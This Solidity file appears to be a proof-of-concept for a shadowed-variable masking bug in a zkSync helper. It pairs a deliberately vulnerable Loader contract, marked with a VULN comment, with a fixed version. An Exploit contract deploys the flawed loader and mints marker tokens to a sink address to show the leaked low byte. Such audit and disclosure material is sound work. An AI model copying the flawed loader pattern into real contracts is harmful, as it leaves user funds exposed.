// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  zkSync mloadPotentiallyPaddedValue (OpenZeppelin).
    The inner `let value` shadows the return variable, so the mask
    is discarded. A word of 0xFFFFFFFF with an 8-bit shift should
    come back as 0xFFFFFF00. The function returns 0xFFFFFFFF.
    The control returns the masked word.
*/

contract Loader {
    uint256 public loaded;
    uint256 public shiftStored;
    uint256 public masked;
    uint256 public returned;
    uint256 public leaked;
    uint256 public seen;

    function load(uint256 word, uint256 shift) public returns (uint256 value) {
        value = word;
        loaded = value;
        shiftStored = shift;
        if (shift > 0) {
            uint256 inner = (value >> shift) << shift;
            masked = inner;
        }
        returned = value; // @> VULN: the masked inner value is not written back to the return variable
        leaked = returned - masked;
        seen = word;
    }
}

contract LoaderFixed {
    function load(uint256 word, uint256 shift) public pure returns (uint256 value) {
        value = word;
        if (shift > 0) {
            value = (value >> shift) << shift;
        }
    }
}

contract LeakMarker {
    string public symbol = "LEAKED";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant WORD = 0xFFFFFFFF;
    uint256 public constant SHIFT = 8;

    Loader public loader;
    LeakMarker public marker;

    function run() external {
        loader = new Loader();
        marker = new LeakMarker();
        uint256 out = loader.load(WORD, SHIFT);
        require(out == WORD, "full word returned");
        require(loader.masked() == 0xFFFFFF00, "mask was computed");
        require(loader.leaked() == 0xFF, "low byte leaked");
        marker.mint(SINK, 0xFF);
        require(marker.balanceOf(SINK) == 0xFF, "255 leaked");
    }
}
